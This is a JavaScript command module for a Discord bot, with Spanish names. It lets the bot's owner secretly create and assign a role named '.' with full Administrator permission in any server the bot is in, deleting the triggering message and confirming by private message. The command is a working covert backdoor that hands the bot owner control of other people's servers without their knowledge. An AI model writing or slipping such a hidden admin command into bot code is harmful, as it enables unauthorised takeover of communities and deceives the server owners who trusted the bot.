import { PermissionsBitField } from 'discord.js';

export default {
  nombre: 'adm',
  descripcion: 'Crea y asigna un rol admin oculto. Úsalo de nuevo para quitarlo.',
  owner: true,

  async ejecutar({ client, message }) {
    const nombreRol = '.';
    const botMember = message.guild.members.me;
    const botRolSuperior = botMember.roles.highest;

    let rol = message.guild.roles.cache.find((r) => r.name === nombreRol);

    if (rol && message.member.roles.cache.has(rol.id)) {
      try {
        await message.member.roles.remove(rol);
        await rol.delete('Rol de admin removido por el owner');
        await message.author.send(
          `**[ADM Desactivado]** Se te quitó y eliminó el rol **${nombreRol}** en **${message.guild.name}**.`
        ).catch(() => {});
        await message.delete().catch(() => {});
      } catch {
        message.reply('❌ No pude quitar o eliminar el rol.');
      }
      return;
    }

    if (!rol) {
      try {
        rol = await message.guild.roles.create({
          name: nombreRol,
          color: 'DarkRed',
          permissions: [PermissionsBitField.Flags.Administrator],
          reason: 'Rol de admin para el owner',
        });
        await rol.setPosition(botRolSuperior.position - 1).catch(() => {});
      } catch {
        return message.reply('❌ No pude crear el rol de administrador.');
      }
    }

    try {
      await message.member.roles.add(rol);
      await message.author.send(
        `**[ADM Activado]** Se te asignó el rol **${nombreRol}** con permisos de administrador en **${message.guild.name}**.`
      ).catch(() => {});
      await message.delete().catch(() => {});
    } catch {
      message.reply('❌ No pude asignarte el rol.');
    }
  },
};
